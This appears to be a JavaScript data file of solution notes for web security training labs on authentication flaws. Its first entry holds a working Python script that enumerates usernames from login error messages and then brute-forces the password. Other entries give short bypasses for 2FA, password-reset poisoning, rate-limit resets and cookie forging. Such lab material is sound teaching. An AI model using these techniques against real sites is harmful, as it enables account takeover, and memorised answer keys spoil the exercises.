export default {
  'authentication-lab-username-enumeration-via-different-responses': {
    note: 'The login error differs for unknown users and wrong passwords; fuzz usernames, then brute-force the matching account.',
    work: {
      hints: [
        'Submit a known-bad username and a known-bad password. Read the exact error text, including punctuation.',
        'A valid username produces a different message than an invalid one. That difference is an oracle; automate it over a wordlist.',
        'Enumerate usernames from the provided list, then brute-force that account\'s password. The response text is the classifier.'
      ],
      approach:
        'The application distinguishes "no such user" from "wrong password". That turns the login form into a username oracle, and the recovered username narrows the password attack to a single account instead of the full cartesian product.',
      request: `POST /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=alice&password=wrong`,
      tokens: [
        ['username=alice', 'The candidate value under test. Each request changes only this field.'],
        ['password=wrong', 'A constant invalid password so the only variable is the username.'],
        ['(response text)', 'The oracle: "Invalid username" vs "Incorrect password". Compare exactly, including whitespace.'],
        ['(timing)', 'A secondary oracle if the text is identical: valid users reach the password hash.']
      ],
      script: `import sys, requests

host, userlist, passlist = sys.argv[1], sys.argv[2], sys.argv[3]
base = f"https://{host}"
s = requests.Session()

def attempt(u, p):
    r = s.post(f"{base}/login", data={"username": u, "password": p},
               allow_redirects=False, timeout=20)
    return r.status_code, r.text

_, baseline = attempt("definitely-not-a-user", "x")
username = None
for u in open(userlist).read().split():
    _, body = attempt(u, "x")
    if "Invalid username" not in body:
        username = u
        break
print("username:", username)

for p in open(passlist).read().split():
    status, body = attempt(username, p)
    if status == 302 or "Incorrect password" not in body:
        print("password:", p)
        break`
    }
  },
  'authentication-lab-2fa-simple-bypass': {
    note: 'The session is authenticated after the password step; navigate straight to `/my-account` and skip the code.'
  },
  'authentication-lab-password-reset-broken-logic': {
    note: 'The reset token is optional or not bound to the user; submit the form with the victim\'s username and no token.'
  },
  'authentication-lab-username-enumeration-via-subtly-different-responses': {
    note: 'The error text differs by a trailing space or punctuation; compare responses byte-for-byte, not visually.'
  },
  'authentication-lab-username-enumeration-via-response-timing': {
    note: 'Valid users trigger a slow password hash; measure repeated requests and compare timing distributions, not single samples.'
  },
  'authentication-lab-broken-bruteforce-protection-ip-block': {
    note: 'The IP block counts consecutive failures; interleave a successful login for your own account to reset the counter.'
  },
  'authentication-lab-username-enumeration-via-account-lock': {
    note: 'Only valid accounts lock after N failures, so the lockout itself is the enumeration oracle.'
  },
  'authentication-lab-2fa-broken-logic': {
    note: 'The verify endpoint trusts a client-supplied username and does not bind the code to a pending session.'
  },
  'authentication-lab-brute-forcing-a-stay-logged-in-cookie': {
    note: 'The remember-me cookie is base64 of `username:md5(password)`; forge and test candidates offline of the login form.'
  },
  'authentication-lab-offline-password-cracking': {
    note: 'A stolen cookie contains a hash; crack it with a wordlist, then reuse the password to log in.'
  },
  'authentication-lab-password-reset-poisoning-via-middleware': {
    note: '`X-Forwarded-Host` is used to build the reset link; point it at your server and capture the victim\'s token.'
  },
  'authentication-lab-password-brute-force-via-password-change': {
    note: 'The change-password form does not rate-limit the current-password check or mismatched usernames.'
  },
  'authentication-lab-broken-brute-force-protection-multiple-credentials-per-request': {
    note: 'The endpoint accepts a JSON array of passwords in one request, bypassing the per-request attempt counter.'
  },
  'authentication-lab-2fa-bypass-using-a-brute-force-attack': {
    note: 'A four-digit 2FA code has no attempt limit and the session stays pending; brute-force all 10,000 values.'
  }
}
